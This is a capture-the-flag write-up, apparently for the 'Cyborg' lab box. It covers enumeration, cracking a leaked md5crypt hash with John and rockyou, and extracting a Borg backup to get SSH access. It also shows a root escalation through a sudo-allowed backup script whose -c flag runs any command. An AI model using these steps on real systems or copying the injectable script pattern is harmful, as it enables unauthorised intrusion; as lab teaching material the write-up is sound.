# Cyborg

### Cyborg
Nmap scan shows ports 22 and 80 open.
Port 80 is a default apache webserver. Gobuster shows directories `/admin` and `/etc`.<br />
From `/etc` I found the following credentials:`music_archive:$apr1.Q.1m$F0qqPwHSOG50URuOVQTTn.` and also the following squid config file:
    
    auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
    auth_param basic children 5
    auth_param basic realm Squid Basic Authentication
    auth_param basic credentialsttl 2 hours
    acl auth_users proxy_auth REQUIRED
    http_access allow auth_users

From the admin portal I download a file called `archive.tar`. This is a Borg backup. To instal borg on kali, run `apt install borgbackup`.<br />
I need to crack the password in order to decrypt this backup. I put the hash inside a file `hash.txt` and run `john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`. This finds the password.<br />
With this password, I can find the name of the original archive:<br />
![image](https://github.com/user-attachments/assets/6fe4e8c3-ed4f-4c90-8071-31c582ca34d9)<br />
And can decrypt the data with `borg extract home/field/dev/final_archive::music_archive`.<br />
So now I have a decrypted duplicate of the backup:<br />
![image](https://github.com/user-attachments/assets/af0d0ec4-9f99-45a7-9ac6-1a1be98d1d09)<br />
Inside `/alex/Documents` there's a note containing the ssh password for alex, this gives me the user flag.<br />
Now for privesc, if I run `sudo -l`, I get:<br />
![image](https://github.com/user-attachments/assets/81ba4fb5-01ac-4b29-ba88-9181944dda2a)<br />
This is the code of this file:

      #!/bin/bash
      
      sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt
      
      
      input="/etc/mp3backups/backed_up_files.txt"
      #while IFS= read -r line
      #do
        #a="/etc/mp3backups/backed_up_files.txt"
      #  b=$(basename $input)
        #echo
      #  echo "$line"
      #done < "$input"
      
      while getopts c: flag
      do
              case "${flag}" in 
                      c) command=${OPTARG};;
              esac
      done
      
      
      
      backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"
      
      # Where to backup to.
      dest="/etc/mp3backups/"
      
      # Create archive filename.
      hostname=$(hostname -s)
      archive_file="$hostname-scheduled.tgz"
      
      # Print start status message.
      echo "Backing up $backup_files to $dest/$archive_file"
      
      echo
      
      # Backup the files using tar.
      tar czf $dest/$archive_file $backup_files
      
      # Print end status message.
      echo
      echo "Backup finished"
      
      cmd=$($command)
      echo $cmd


I want to focus on this part:

      SNIP...
      while getopts c: flag
      do
              case "${flag}" in 
                      c) command=${OPTARG};;
              esac
      done
      
      SNIP....
      
      cmd=$($command)
      echo $cmd
This code allows me to run any command by just using the `-c` flag. <br />
To exploit this, just run `sudo /etc/mp3backups/backup.sh -c /bin/bash` and become root.


